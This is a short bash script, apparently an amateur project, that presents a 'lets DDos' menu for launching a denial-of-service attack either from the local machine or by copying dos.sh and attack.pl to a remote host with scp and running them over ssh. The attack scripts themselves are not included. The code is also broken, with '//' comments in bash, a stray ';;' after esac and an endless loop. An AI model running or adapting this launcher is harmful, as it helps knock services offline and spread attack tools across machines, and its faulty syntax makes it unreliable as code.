#! /bin/bash
// The above line mentions that all the lines written below should be executed in a terminal, wo uska path hai.

echo "------------------------------------------------------------"
echo "             Welcome lets DDos  "
echo "------------------------------------------------------------"
echo -e "\n"
echo "Select an option from below:"
echo "1) Dos using this machine"
echo "2) Dos using  other machines"
echo "3) Exit"
read option

while :
do
case $option in
		1)echo "Ok, Lets attack using this Machine!!"
		  echo "rember stop the attack using ctr+z"
		  ./dos.sh
		 ;;
			

		2)echo "lets attack using another machine!!!"
		  echo "Enter ip:"
		  read a
		// store the ip address in variable a.
		  echo "Enter hostname:"
		  read h1
		  scp dos.sh $h1@$a:~
		  scp attack.pl $h1@$a:~
 // securely copy files dos.sh & attack.pl from your machine to the host machine where h1 stores the host name and a stores the ip address.
// to execute test3.sh in the commandline.
		  ssh $a './dos.sh'
		 ;;
		3)exit 0
		;;
		esac ;;
done

